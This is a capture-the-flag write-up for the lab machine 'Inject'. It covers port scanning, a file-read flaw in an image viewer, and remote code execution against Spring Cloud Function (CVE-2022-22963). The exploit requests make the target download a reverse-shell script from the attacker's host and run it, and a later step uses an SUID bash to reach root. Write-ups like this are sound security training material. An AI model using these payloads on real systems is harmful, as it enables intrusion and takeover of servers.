

![1](</Writeups/Machines/Inject/img/logo.png>)
By Rug4lo

## Reconnaissance

Let's start with a port scan using Nmap
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.204
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-04 16:31 CEST
Initiating SYN Stealth Scan at 16:31
Scanning 10.10.11.204 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.204
Discovered open port 22/tcp on 10.10.11.204
Completed SYN Stealth Scan at 16:32, 14.18s elapsed (65535 total ports)
Nmap scan report for 10.10.11.204
Host is up, received user-set (0.11s latency).
Scanned at 2023-10-04 16:31:58 CEST for 14s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.31 seconds
           Raw packets sent: 70185 (3.088MB) | Rcvd: 69796 (2.792MB)
```
Now let's use Nmap with the basic reconnaissance scripts
```bash
nmap -sCV -p22,8080 10.10.11.204 -oN Targeted
```
```bash
Nmap scan report for 10.10.11.204
Host is up (0.14s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
```
If we look around the site a bit we'll see that it has a file upload section

![1](</Writeups/Machines/Inject/img/1.png>)

## Exploiting the LFI

When we upload a file we'll see that it lets us view the image we uploaded, but if we look closely at the url we'll see that there's a chance of an LFI

![1](</Writeups/Machines/Inject/img/2.png>)

We can try to read the machine's etc/passwd (with burpsuite we'll be able to see the output)

![1](</Writeups/Machines/Inject/img/3.png>)

We'll also see that we have directory listing capability

![1](</Writeups/Machines/Inject/img/4.png>)

With all this we can go looking for anything interesting, and if we search we'll find that this site is using **springframework**

![1](</Writeups/Machines/Inject/img/5.png>)
![1](</Writeups/Machines/Inject/img/6.png>)

## Abusing the outdated Spring framework

Searching around we'll find a CVE for that component

CVE --> https://github.com/me2nuk/CVE-2022-22963

If we send the request exactly as the CVE describes and tell it to ping our machine, we'll see that it runs the command perfectly
```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.9:8081")' --data-raw 'data' -v
```
Now we can try to send a Reverse Shell, but it won't work. As a workaround we can create a file containing the Reverse Shell command in our working directory and make the target download it and then execute it

If we spin up an http server with Python in the directory holding the reverse shell and curl it from the target, we'll be able to confirm via the LFI that it was downloaded
```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.9:8081/reverse.sh -o /var/www/WebApp/reverse")' --data-raw 'data' -v
```
Now we just have to execute it
```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /var/www/WebApp/reverse")' --data-raw 'data' -v
```
## Escalating from user Frank to Phil

And with this we now have access as the user  **Frank**; now to get the flag we need to escalate to the user **Phil**

Inside user Frank's home directory we can see there is an odd folder (.m2); this folder contains a settings.xml which holds the password for the user Phil

![1](</Writeups/Machines/Inject/img/7.png>)

## Escalating from user Phil to Root

If we try this password we'll see that it is correct and we'll be able to read the user flag.

![1](</Writeups/Machines/Inject/img/8.png>)

Now for root, we start by transferring pspy to the victim machine; with it we'll see that there is a process that is curious to say the least

![1](</Writeups/Machines/Inject/img/9.png>)

There is an automated process running every .yml file in the /tasks folder

We go to the folder, and we'll see that since we are in the staff group we can create files inside it!

![1](</Writeups/Machines/Inject/img/10.png>)

Now we'll create a .yml that runs a command to set the SUID bit on bash when ansible executes this file:

![1](</Writeups/Machines/Inject/img/11.png>)

When the process runs it will delete our yml but it will leave bash as SUID

![1](</Writeups/Machines/Inject/img/12.png>)

Now we just have to run it 
```bash
/bin/bash -p
```
And we'll have access to the root flag

![1](</Writeups/Machines/Inject/img/13.png>)
